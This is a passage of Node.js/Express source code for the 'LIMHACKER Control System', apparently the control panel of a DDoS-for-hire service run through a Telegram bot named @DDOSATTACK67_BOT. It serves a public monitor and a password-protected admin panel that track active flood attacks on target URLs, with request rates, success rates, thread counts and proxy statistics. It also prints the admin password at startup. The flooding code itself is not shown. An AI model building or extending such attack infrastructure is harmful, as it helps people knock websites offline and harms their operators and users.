const port = process.env.PORT || 3000;
const HOST = '::';

app.use(session({
    secret: SESSION_SECRET,
    resave: false,
    saveUninitialized: true,
    cookie: { 
        secure: process.env.NODE_ENV === 'production',
        maxAge: 3600000,
        httpOnly: true,
        sameSite: 'strict'
    }
}));

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static('public'));

const isAuthenticated = (req, res, next) => {
    if (req.session.authenticated) next();
    else res.status(401).json({ error: 'Unauthorized' });
};

// Professional Red Theme CSS with full styling
const redTheme = `
<style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }

    :root {
        --bg-primary: #0a0505;
        --bg-secondary: #1a0a0a;
        --bg-tertiary: #2a0f0f;
        --text-primary: #ffcccc;
        --text-secondary: #ff9999;
        --text-muted: #ff6666;
        --accent-primary: #ff0000;
        --accent-secondary: #cc0000;
        --border-color: #660000;
        --shadow-color: rgba(255, 0, 0, 0.2);
        --font-mono: 'JetBrains Mono', 'Courier New', monospace;
        --font-sans: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    }

    * {
        scrollbar-width: thin;
        scrollbar-color: var(--accent-primary) var(--bg-tertiary);
    }

    ::-webkit-scrollbar {
        width: 8px;
        height: 8px;
    }

    ::-webkit-scrollbar-track {
        background: var(--bg-tertiary);
    }

    ::-webkit-scrollbar-thumb {
        background: var(--accent-primary);
        border-radius: 4px;
    }

    body {
        background: var(--bg-primary);
        color: var(--text-primary);
        font-family: var(--font-sans);
        line-height: 1.6;
        min-height: 100vh;
        position: relative;
    }

    body::before {
        content: '';
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: 
            radial-gradient(circle at 20% 50%, rgba(255, 0, 0, 0.05) 0%, transparent 50%),
            radial-gradient(circle at 80% 80%, rgba(255, 0, 0, 0.05) 0%, transparent 50%);
        pointer-events: none;
        z-index: 0;
    }

    .container {
        max-width: 1600px;
        margin: 0 auto;
        padding: 2rem;
        position: relative;
        z-index: 1;
    }

    .header {
        background: var(--bg-secondary);
        border: 1px solid var(--border-color);
        border-radius: 12px;
        padding: 1.5rem;
        margin-bottom: 2rem;
        box-shadow: 0 4px 20px var(--shadow-color);
        border-left: 4px solid var(--accent-primary);
        display: flex;
        justify-content: space-between;
        align-items: center;
    }

    .header h1 {
        font-family: var(--font-mono);
        font-size: 2rem;
        font-weight: 600;
        color: var(--accent-primary);
        text-transform: uppercase;
        letter-spacing: 2px;
    }

    .header h1::before {
        content: '>';
        color: var(--accent-primary);
        margin-right: 0.5rem;
        animation: blink 1s infinite;
    }

    @keyframes blink {
        0%, 100% { opacity: 1; }
        50% { opacity: 0; }
    }

    .status-badge {
        background: var(--bg-tertiary);
        border: 1px solid var(--border-color);
        border-radius: 20px;
        padding: 0.5rem 1.5rem;
        color: var(--accent-primary);
        display: inline-flex;
        align-items: center;
        gap: 0.5rem;
    }

    .status-badge::before {
        content: '';
        width: 8px;
        height: 8px;
        background: var(--accent-primary);
        border-radius: 50%;
        animation: pulse 2s infinite;
    }

    @keyframes pulse {
        0%, 100% { opacity: 1; transform: scale(1); }
        50% { opacity: 0.5; transform: scale(1.2); }
    }

    .stats-grid {
        display: grid;
        grid-template-columns: repeat(4, 1fr);
        gap: 1.5rem;
        margin: 2rem 0;
    }

    .stat-card {
        background: var(--bg-secondary);
        border: 1px solid var(--border-color);
        border-radius: 12px;
        padding: 1.5rem;
        transition: all 0.3s ease;
        border-left: 4px solid var(--accent-primary);
    }

    .stat-card:hover {
        transform: translateY(-2px);
        box-shadow: 0 8px 30px var(--shadow-color);
    }

    .stat-value {
        font-size: 2.5rem;
        font-weight: 600;
        color: var(--accent-primary);
        font-family: var(--font-mono);
    }

    .stat-label {
        color: var(--text-muted);
        font-size: 0.9rem;
        text-transform: uppercase;
        letter-spacing: 1px;
    }

    .attack-list {
        margin: 2rem 0;
    }

    .attack-item {
        background: var(--bg-secondary);
        border: 1px solid var(--border-color);
        border-radius: 12px;
        padding: 1.5rem;
        margin-bottom: 1rem;
        border-left: 4px solid var(--accent-primary);
    }

    .attack-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        flex-wrap: wrap;
        gap: 1rem;
        margin-bottom: 1rem;
        padding-bottom: 1rem;
        border-bottom: 1px solid var(--border-color);
    }

    .attack-id {
        font-family: var(--font-mono);
        color: var(--accent-secondary);
        background: var(--bg-tertiary);
        padding: 0.25rem 0.75rem;
        border-radius: 4px;
        font-size: 0.9rem;
    }

    .attacker-badge {
        background: var(--bg-tertiary);
        border: 1px solid var(--accent-primary);
        border-radius: 20px;
        padding: 0.25rem 1rem;
        font-size: 0.9rem;
        display: inline-flex;
        align-items: center;
        gap: 0.5rem;
    }

    .attacker-badge::before {
        content: '@';
        color: var(--accent-primary);
        font-weight: bold;
    }

    .attack-timestamp {
        color: var(--text-muted);
        font-size: 0.8rem;
        font-family: var(--font-mono);
    }

    .attack-target {
        color: var(--text-secondary);
        margin-bottom: 1rem;
        word-break: break-all;
        font-size: 1.1rem;
    }

    .progress-bar {
        width: 100%;
        height: 8px;
        background: var(--bg-tertiary);
        border-radius: 4px;
        overflow: hidden;
        margin: 0.5rem 0;
    }

    .progress-fill {
        height: 100%;
        background: linear-gradient(90deg, var(--accent-primary), var(--accent-secondary));
        transition: width 0.3s ease;
    }

    .progress-stats {
        display: flex;
        justify-content: space-between;
        color: var(--text-muted);
        font-size: 0.9rem;
    }

    .attack-meta {
        display: flex;
        justify-content: space-between;
        color: var(--text-muted);
        font-size: 0.9rem;
        margin-top: 0.5rem;
    }

    .attack-stats-grid {
        display: grid;
        grid-template-columns: repeat(5, 1fr);
        gap: 1rem;
        margin: 1rem 0;
    }

    .attack-stat {
        background: var(--bg-tertiary);
        border: 1px solid var(--border-color);
        border-radius: 8px;
        padding: 0.75rem;
        text-align: center;
    }

    .attack-stat-label {
        color: var(--text-muted);
        font-size: 0.75rem;
        text-transform: uppercase;
    }

    .attack-stat-value {
        color: var(--accent-primary);
        font-family: var(--font-mono);
        font-size: 1.2rem;
        font-weight: bold;
    }

    .attack-stat-value.success {
        color: #00ff00;
    }

    .attack-stat-value.failed {
        color: #ff0000;
    }

    .live-indicator {
        display: inline-block;
        width: 8px;
        height: 8px;
        background: #00ff00;
        border-radius: 50%;
        margin-right: 0.5rem;
        animation: pulse 1s infinite;
    }

    .btn {
        background: var(--bg-tertiary);
        border: 1px solid var(--border-color);
        border-radius: 8px;
        padding: 0.75rem 1.5rem;
        color: var(--text-primary);
        font-family: var(--font-sans);
        font-size: 0.95rem;
        cursor: pointer;
        transition: all 0.3s ease;
        display: inline-flex;
        align-items: center;
        gap: 0.5rem;
        text-decoration: none;
    }

    .btn:hover {
        border-color: var(--accent-primary);
        color: var(--accent-primary);
        transform: translateY(-1px);
    }

    .btn-primary {
        background: var(--accent-primary);
        color: white;
    }

    .btn-primary:hover {
        background: var(--accent-secondary);
        border-color: var(--accent-secondary);
    }

    .admin-login {
        background: transparent;
        border: 1px solid var(--border-color);
        border-radius: 8px;
        padding: 0.75rem 1.5rem;
        color: var(--text-primary);
        text-decoration: none;
        transition: all 0.3s ease;
        margin-left: 1rem;
    }

    .admin-login:hover {
        border-color: var(--accent-primary);
        color: var(--accent-primary);
    }

    .footer {
        margin-top: 4rem;
        padding-top: 2rem;
        border-top: 1px solid var(--border-color);
        text-align: center;
        color: var(--text-muted);
    }

    @media (max-width: 768px) {
        .stats-grid {
            grid-template-columns: 1fr;
        }
        
        .header {
            flex-direction: column;
            gap: 1rem;
        }
        
        .attack-stats-grid {
            grid-template-columns: repeat(2, 1fr);
        }
        
        .attack-header {
            flex-direction: column;
            align-items: flex-start;
        }
    }
</style>
`;

// ========== USER PANEL WITH ATTACKER TRACKING ==========
app.get('/', (req, res) => {
    const uptime = Math.floor((Date.now() - metrics.startTime) / 1000);
    const hours = Math.floor(uptime / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);
    const seconds = uptime % 60;
    
    const proxyStats = proxyManager.getStats();
    const runningAttacks = countRunningAttacks();
    
    // Sort attacks by start time (newest first)
    const sortedAttacks = Array.from(attacks.entries())
        .filter(([_, a]) => a.isRunning)
        .sort((a, b) => b[1].startTime - a[1].startTime);
    
    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>LIMHACKER Control System</title>
            <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono&display=swap" rel="stylesheet">
            ${redTheme}
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>LIMHACKER Control System</h1>
                    <div>
                        <span class="status-badge">SYSTEM ONLINE</span>
                        <a href="/login" class="admin-login">ADMIN ACCESS</a>
                    </div>
                </div>

                <div class="stats-grid">
                    <div class="stat-card">
                        <div class="stat-value">${runningAttacks}</div>
                        <div class="stat-label">Active Attacks</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">${formatNumber(metrics.totalRequests)}</div>
                        <div class="stat-label">Total Requests</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">${formatBytes(metrics.totalBytes)}</div>
                        <div class="stat-label">Bandwidth Used</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">${proxyStats.active}</div>
                        <div class="stat-label">Active Proxies</div>
                    </div>
                </div>

                <h2 style="margin-bottom: 1rem; color: var(--accent-primary); display: flex; align-items: center; gap: 1rem;">
                    <span>🎯 Active Attacks</span>
                    <span class="live-indicator"></span>
                    <span class="attack-timestamp">Last Update: ${new Date().toLocaleTimeString()}</span>
                </h2>
                
                <div class="attack-list">
                    ${sortedAttacks.length > 0 ? sortedAttacks.map(([id, attack]) => {
                        const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
                        const percent = Math.min(100, Math.floor((elapsed / attack.duration) * 100));
                        const successRate = calculateSuccessRate(attack);
                        const timeRemaining = attack.duration - elapsed;
                        
                        // Format start time
                        const startTimeStr = new Date(attack.startTime).toLocaleTimeString();
                        
                        // Determine status color based on success rate
                        let statusColor = 'var(--accent-primary)';
                        let statusText = 'ACTIVE';
                        if (successRate > 80) {
                            statusColor = '#00ff00';
                            statusText = 'STRONG';
                        } else if (successRate > 50) {
                            statusColor = '#ffff00';
                            statusText = 'MODERATE';
                        } else if (successRate > 20) {
                            statusColor = '#ff8800';
                            statusText = 'WEAK';
                        } else {
                            statusColor = '#ff0000';
                            statusText = 'CRITICAL';
                        }
                        
                        return `
                        <div class="attack-item">
                            <div class="attack-header">
                                <div style="display: flex; align-items: center; gap: 1rem; flex-wrap: wrap;">
                                    <span class="attack-id">#${id}</span>
                                    <span class="attacker-badge">${attack.username}</span>
                                    <span class="attack-timestamp">
                                        Started: ${startTimeStr}
                                    </span>
                                </div>
                                <div>
                                    <span style="color: ${statusColor}; font-weight: bold; padding: 0.25rem 0.75rem; background: var(--bg-tertiary); border-radius: 4px;">
                                        ${statusText}
                                    </span>
                                </div>
                            </div>
                            
                            <div class="attack-target">
                                🎯 ${attack.url}
                            </div>
                            
                            <div style="background: var(--bg-tertiary); border-radius: 8px; padding: 1rem;">
                                <div style="display: flex; justify-content: space-between; margin-bottom: 0.5rem;">
                                    <span>Progress</span>
                                    <span>${percent}% Complete</span>
                                </div>
                                <div class="progress-bar">
                                    <div class="progress-fill" style="width: ${percent}%"></div>
                                </div>
                                <div class="attack-meta">
                                    <span>⏱️ Elapsed: ${elapsed}s</span>
                                    <span>⏳ Remaining: ${timeRemaining}s</span>
                                    <span>⚡ Total: ${attack.duration}s</span>
                                </div>
                            </div>

                            <div class="attack-stats-grid">
                                <div class="attack-stat">
                                    <div class="attack-stat-label">Requests</div>
                                    <div class="attack-stat-value">${formatNumber(attack.requestCount)}</div>
                                </div>
                                <div class="attack-stat">
                                    <div class="attack-stat-label">Success</div>
                                    <div class="attack-stat-value success">${formatNumber(attack.successCount)}</div>
                                </div>
                                <div class="attack-stat">
                                    <div class="attack-stat-label">Failed</div>
                                    <div class="attack-stat-value failed">${formatNumber(attack.failCount)}</div>
                                </div>
                                <div class="attack-stat">
                                    <div class="attack-stat-label">Success Rate</div>
                                    <div class="attack-stat-value" style="color: ${statusColor};">${successRate}%</div>
                                </div>
                                <div class="attack-stat">
                                    <div class="attack-stat-label">RPS</div>
                                    <div class="attack-stat-value">${Math.floor(attack.requestCount / Math.max(1, elapsed))}</div>
                                </div>
                            </div>

                            <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 1rem; padding-top: 1rem; border-top: 1px solid var(--border-color);">
                                <div>
                                    <span style="color: var(--text-muted);">Pattern:</span>
                                    <span style="margin-left: 0.5rem; color: var(--accent-primary);">${attack.pattern.toUpperCase()}</span>
                                </div>
                                <div>
                                    <span style="color: var(--text-muted);">Threads:</span>
                                    <span style="margin-left: 0.5rem; color: var(--accent-primary);">${attack.threads}</span>
                                </div>
                                <div>
                                    <span style="color: var(--text-muted);">Rate:</span>
                                    <span style="margin-left: 0.5rem; color: var(--accent-primary);">${formatNumber(attack.rate)}/s</span>
                                </div>
                            </div>
                        </div>
                        `;
                    }).join('') : `
                    <div style="text-align: center; padding: 3rem; background: var(--bg-secondary); border-radius: 12px; border: 1px solid var(--border-color);">
                        <p style="color: var(--text-muted); font-size: 1.2rem;">No active attacks</p>
                        <p style="color: var(--text-muted); margin-top: 1rem;">Use Telegram bot to launch attacks</p>
                        <div style="margin-top: 2rem;">
                            <a href="https://t.me/DDOSATTACK67_BOT" class="btn btn-primary">OPEN TELEGRAM BOT</a>
                        </div>
                    </div>
                    `}
                </div>

                <div class="footer">
                    <p>LIMHACKER Control System v4.0 | ${new Date().toLocaleString()}</p>
                    <p style="margin-top: 1rem;">
                        <button class="btn" onclick="location.reload()">REFRESH</button>
                        <a href="https://t.me/DDOSATTACK67_BOT" class="btn" style="margin-left: 1rem;">TELEGRAM BOT</a>
                    </p>
                </div>
            </div>

            <script>
                // Auto-refresh every 5 seconds for real-time updates
                setTimeout(() => {
                    location.reload();
                }, 5000);
            </script>
        </body>
        </html>
    `);
});

// ========== LOGIN PAGE ==========
app.get('/login', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>LIMHACKER Admin Login</title>
            <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
            ${redTheme}
            <style>
                .login-container {
                    max-width: 400px;
                    margin: 100px auto;
                    background: var(--bg-secondary);
                    border: 1px solid var(--border-color);
                    border-radius: 12px;
                    padding: 2rem;
                    border-left: 4px solid var(--accent-primary);
                }

                .login-header {
                    text-align: center;
                    margin-bottom: 2rem;
                }

                .login-header h1 {
                    font-family: var(--font-mono);
                    color: var(--accent-primary);
                }

                .form-group {
                    margin-bottom: 1.5rem;
                }

                .form-group input {
                    width: 100%;
                    padding: 0.75rem;
                    background: var(--bg-tertiary);
                    border: 1px solid var(--border-color);
                    border-radius: 8px;
                    color: var(--text-primary);
                    font-family: var(--font-mono);
                    font-size: 1rem;
                }

                .form-group input:focus {
                    outline: none;
                    border-color: var(--accent-primary);
                }

                .login-btn {
                    width: 100%;
                    padding: 0.75rem;
                    background: var(--accent-primary);
                    color: white;
                    border: none;
                    border-radius: 8px;
                    font-size: 1rem;
                    cursor: pointer;
                }

                .login-btn:hover {
                    background: var(--accent-secondary);
                }

                .error-message {
                    background: rgba(255, 0, 0, 0.1);
                    border: 1px solid var(--accent-danger);
                    border-radius: 8px;
                    padding: 1rem;
                    margin-bottom: 1rem;
                    color: var(--accent-danger);
                    text-align: center;
                }

                .back-link {
                    text-align: center;
                    margin-top: 1.5rem;
                }

                .back-link a {
                    color: var(--text-muted);
                    text-decoration: none;
                }

                .back-link a:hover {
                    color: var(--accent-primary);
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="login-container">
                    <div class="login-header">
                        <h1>LIMHACKER ADMIN</h1>
                        <p style="color: var(--text-muted);">Enter your credentials</p>
                    </div>

                    ${req.query.error ? '<div class="error-message">Invalid credentials</div>' : ''}

                    <form method="POST" action="/login">
                        <div class="form-group">
                            <input type="password" name="password" placeholder="Password" required autofocus>
                        </div>
                        <button type="submit" class="login-btn">AUTHENTICATE</button>
                    </form>

                    <div class="back-link">
                        <a href="/">← Return to monitor</a>
                    </div>
                </div>
            </div>
        </body>
        </html>
    `);
});

app.post('/login', (req, res) => {
    const { password } = req.body;
    if (password === ADMIN_PASSWORD) {
        req.session.authenticated = true;
        req.session.loginTime = Date.now();
        res.redirect('/admin');
    } else {
        res.redirect('/login?error=1');
    }
});

// ========== ADMIN PANEL ==========
app.get('/admin', isAuthenticated, (req, res) => {
    const uptime = Math.floor((Date.now() - metrics.startTime) / 1000);
    const hours = Math.floor(uptime / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);
    const sessionTime = Math.floor((Date.now() - req.session.loginTime) / 1000);
    const sessionHours = Math.floor(sessionTime / 3600);
    const sessionMinutes = Math.floor((sessionTime % 3600) / 60);
    const sessionSeconds = sessionTime % 60;
    
    const proxyStats = proxyManager.getStats();
    const runningAttacks = countRunningAttacks();
    
    // Sort attacks by start time (newest first)
    const sortedAttacks = Array.from(attacks.entries())
        .filter(([_, a]) => a.isRunning)
        .sort((a, b) => b[1].startTime - a[1].startTime);
    
    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>LIMHACKER Admin Panel</title>
            <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono&display=swap" rel="stylesheet">
            ${redTheme}
            <style>
                .admin-grid {
                    display: grid;
                    grid-template-columns: 1fr 1fr;
                    gap: 1.5rem;
                    margin: 2rem 0;
                }

                .admin-panel {
                    background: var(--bg-secondary);
                    border: 1px solid var(--border-color);
                    border-radius: 12px;
                    padding: 1.5rem;
                    border-left: 4px solid var(--accent-primary);
                }

                .panel-header {
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    margin-bottom: 1rem;
                    padding-bottom: 1rem;
                    border-bottom: 1px solid var(--border-color);
                }

                .session-info {
                    background: var(--bg-tertiary);
                    border: 1px solid var(--border-color);
                    border-radius: 8px;
                    padding: 1rem;
                    margin-top: 1rem;
                }

                .session-info p {
                    color: var(--text-secondary);
                    margin: 0.25rem 0;
                }

                .command-list {
                    list-style: none;
                    padding: 0;
                }

                .command-list li {
                    padding: 0.5rem;
                    border-bottom: 1px solid var(--border-color);
                    font-family: var(--font-mono);
                    font-size: 0.9rem;
                    color: var(--text-secondary);
                }

                .command-list li:last-child {
                    border-bottom: none;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>LIMHACKER Admin Panel</h1>
                    <div>
                        <span class="status-badge">ADMIN: ${req.sessionID.slice(0, 8)}</span>
                        <a href="/" class="btn">USER VIEW</a>
                        <a href="/logout" class="btn" style="border-color: var(--accent-danger);">LOGOUT</a>
                    </div>
                </div>

                <div class="stats-grid">
                    <div class="stat-card">
                        <div class="stat-value">${runningAttacks}</div>
                        <div class="stat-label">Active Attacks</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">${metrics.totalAttacks}</div>
                        <div class="stat-label">Total Attacks</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">${templates.size}</div>
                        <div class="stat-label">Templates</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">${proxyStats.active}</div>
                        <div class="stat-label">Active Proxies</div>
                    </div>
                </div>

                <div class="admin-grid">
                    <div class="admin-panel">
                        <div class="panel-header">
                            <h3>System Information</h3>
                        </div>
                        <div>
                            <p><strong>Uptime:</strong> ${hours}h ${minutes}m</p>
                            <p><strong>Memory:</strong> ${formatBytes(process.memoryUsage().rss)}</p>
                            <p><strong>CPU Cores:</strong> ${os.cpus().length}</p>
                            <p><strong>Platform:</strong> ${os.platform()} ${os.arch()}</p>
                            <p><strong>Hostname:</strong> ${os.hostname()}</p>
                        </div>
                    </div>

                    <div class="admin-panel">
                        <div class="panel-header">
                            <h3>Session Info</h3>
                        </div>
                        <div class="session-info">
                            <p>Session ID: ${req.sessionID.slice(0, 12)}...</p>
                            <p>Duration: ${sessionHours}h ${sessionMinutes}m ${sessionSeconds}s</p>
                            <p>Total Commands: ${commandHistory.length}</p>
                        </div>
                    </div>
                </div>

                <div style="margin: 2rem 0;">
                    <h3 style="color: var(--accent-primary); margin-bottom: 1rem;">Recent Commands</h3>
                    <div class="admin-panel">
                        <ul class="command-list">
                            ${commandHistory.slice(-10).map(cmd => `<li>> ${cmd}</li>`).join('')}
                            ${commandHistory.length === 0 ? '<li style="color: var(--text-muted);">No commands executed yet</li>' : ''}
                        </ul>
                    </div>
                </div>

                <h2 style="margin: 2rem 0 1rem; color: var(--accent-primary); display: flex; align-items: center; gap: 1rem;">
                    <span>🎯 Active Attacks</span>
                    <span class="live-indicator"></span>
                </h2>
                <div class="attack-list">
                    ${sortedAttacks.length > 0 ? sortedAttacks.map(([id, attack]) => {
                        const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
                        const percent = Math.min(100, Math.floor((elapsed / attack.duration) * 100));
                        const successRate = calculateSuccessRate(attack);
                        const timeRemaining = attack.duration - elapsed;
                        
                        const startTimeStr = new Date(attack.startTime).toLocaleTimeString();
                        
                        let statusColor = 'var(--accent-primary)';
                        let statusText = 'ACTIVE';
                        if (successRate > 80) {
                            statusColor = '#00ff00';
                            statusText = 'STRONG';
                        } else if (successRate > 50) {
                            statusColor = '#ffff00';
                            statusText = 'MODERATE';
                        } else if (successRate > 20) {
                            statusColor = '#ff8800';
                            statusText = 'WEAK';
                        } else {
                            statusColor = '#ff0000';
                            statusText = 'CRITICAL';
                        }
                        
                        return `
                        <div class="attack-item">
                            <div class="attack-header">
                                <div style="display: flex; align-items: center; gap: 1rem; flex-wrap: wrap;">
                                    <span class="attack-id">#${id}</span>
                                    <span class="attacker-badge">${attack.username}</span>
                                    <span class="attack-timestamp">Started: ${startTimeStr}</span>
                                </div>
                                <div>
                                    <span style="color: ${statusColor}; font-weight: bold; padding: 0.25rem 0.75rem; background: var(--bg-tertiary); border-radius: 4px;">
                                        ${statusText}
                                    </span>
                                </div>
                            </div>
                            
                            <div class="attack-target">🎯 ${attack.url}</div>
                            
                            <div style="background: var(--bg-tertiary); padding: 1rem; border-radius: 8px;">
                                <div style="display: flex; justify-content: space-between; margin-bottom: 0.5rem;">
                                    <span>Progress</span>
                                    <span>${percent}% Complete</span>
                                </div>
                                <div class="progress-bar">
                                    <div class="progress-fill" style="width: ${percent}%"></div>
                                </div>
                                <div class="attack-meta">
                                    <span>⏱️ Elapsed: ${elapsed}s</span>
                                    <span>⏳ Remaining: ${timeRemaining}s</span>
                                    <span>⚡ Total: ${attack.duration}s</span>
                                </div>
                            </div>

                            <div class="attack-stats-grid">
                                <div class="attack-stat">
                                    <div class="attack-stat-label">Requests</div>
                                    <div class="attack-stat-value">${formatNumber(attack.requestCount)}</div>
                                </div>
                                <div class="attack-stat">
                                    <div class="attack-stat-label">Success</div>
                                    <div class="attack-stat-value success">${formatNumber(attack.successCount)}</div>
                                </div>
                                <div class="attack-stat">
                                    <div class="attack-stat-label">Failed</div>
                                    <div class="attack-stat-value failed">${formatNumber(attack.failCount)}</div>
                                </div>
                                <div class="attack-stat">
                                    <div class="attack-stat-label">Success Rate</div>
                                    <div class="attack-stat-value" style="color: ${statusColor};">${successRate}%</div>
                                </div>
                                <div class="attack-stat">
                                    <div class="attack-stat-label">RPS</div>
                                    <div class="attack-stat-value">${Math.floor(attack.requestCount / Math.max(1, elapsed))}</div>
                                </div>
                            </div>

                            <div style="display: flex; justify-content: space-between; margin-top: 1rem; padding-top: 1rem; border-top: 1px solid var(--border-color);">
                                <span><span style="color: var(--text-muted);">Pattern:</span> ${attack.pattern.toUpperCase()}</span>
                                <span><span style="color: var(--text-muted);">Threads:</span> ${attack.threads}</span>
                                <span><span style="color: var(--text-muted);">Rate:</span> ${formatNumber(attack.rate)}/s</span>
                            </div>
                        </div>
                        `;
                    }).join('') : '<p style="color: var(--text-muted); text-align: center;">No active attacks</p>'}
                </div>

                <div class="footer">
                    <p>LIMHACKER Admin Panel | ${new Date().toLocaleString()}</p>
                </div>
            </div>
        </body>
        </html>
    `);
});

app.get('/logout', (req, res) => {
    req.session.destroy();
    res.redirect('/');
});

// ========== API ENDPOINTS FOR WEB INTERFACE ==========
app.get('/api/stats', (req, res) => {
    res.json({
        attacks: attacks.size,
        totalAttacks: metrics.totalAttacks,
        totalRequests: metrics.totalRequests,
        totalBytes: metrics.totalBytes,
        peakRPS: metrics.peakRPS,
        proxyStats: proxyManager.getStats(),
        uptime: process.uptime()
    });
});

app.get('/api/attacks', (req, res) => {
    const attackList = Array.from(attacks.entries()).map(([id, a]) => ({
        id,
        url: a.url,
        elapsed: Math.floor((Date.now() - a.startTime) / 1000),
        duration: a.duration,
        requests: a.requestCount,
        success: a.successCount,
        fail: a.failCount,
        successRate: calculateSuccessRate(a),
        username: a.username,
        pattern: a.pattern,
        isRunning: a.isRunning
    }));
    res.json(attackList);
});

app.get('/api/proxies', isAuthenticated, (req, res) => {
    res.json(proxyManager.getProxyList(50));
});

// ========== START SERVER ==========
app.listen(port, HOST, () => {
    console.log('\x1b[31m%s\x1b[0m', `\n┌────────────────────────────────────────┐`);
    console.log('\x1b[31m%s\x1b[0m', `│     LIMHACKER Control System v4.0      │`);
    console.log('\x1b[31m%s\x1b[0m', `├────────────────────────────────────────┤`);
    console.log('\x1b[31m%s\x1b[0m', `│  📱 Telegram: @DDOSATTACK67_BOT        │`);
    console.log('\x1b[31m%s\x1b[0m', `│  👤 Monitor: http://localhost:${port}        │`);
    console.log('\x1b[31m%s\x1b[0m', `│  👑 Admin: http://localhost:${port}/login    │`);
    console.log('\x1b[31m%s\x1b[0m', `│  🔑 Password: ${ADMIN_PASSWORD}         │`);
    console.log('\x1b[31m%s\x1b[0m', `└────────────────────────────────────────┘`);
});

// ========== START BOT ==========
console.log('\n\x1b[31m%s\x1b[0m', '✅ LIMHACKER Control System activated');
console.log('\x1b[31m%s\x1b[0m', '⚡ Ready for operations\n');

bot.launch()
    .then(() => console.log('\x1b[32m%s\x1b[0m', '✅ Telegram bot online'))
    .catch(err => console.error('\x1b[31m%s\x1b[0m', '❌ Bot failed:', err.message));

process.once('SIGINT', () => {
    attacks.forEach(a => a.isRunning && a.process.kill('SIGINT'));
    bot.stop('SIGINT');
    process.exit(0);
});
process.once('SIGTERM', () => {
    bot.stop('SIGTERM');
    process.exit(0);
});
